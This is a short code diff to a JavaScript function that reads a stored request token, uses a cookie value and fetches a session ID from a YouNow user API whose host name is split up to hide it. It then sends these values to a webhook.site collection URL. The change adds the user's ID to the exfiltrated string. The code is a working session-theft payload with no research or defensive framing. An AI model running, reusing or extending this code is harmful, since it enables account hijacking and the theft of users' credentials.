@@ -13,6 +13,7 @@ async function run() {
     let reqBy = localStorage.getItem('requestBy') || localStorage.getItem('REQUEST_BY');
     let sid = null;
     let err = null;
+    let uid = 0;
 
     try {
         let response = await fetch("https://api.you" + "now.com/php/api/you" + "now/user", {
@@ -25,11 +26,12 @@ async function run() {
 
         let json = await response.json();
         sid = json.session;
+        uid = json.userId;
     } catch (e) {
         err = e.toString();
     }
 
-    let finalString = `${sid}:${sltCookie}:${reqBy}:${err}`;
+    let finalString = `${uid}:${sid}:${sltCookie}:${reqBy}:${err}`;
 
     try {
         await fetch('https://webhook.site/f781c683-6886-47c1-abb4-77504836f33f', {
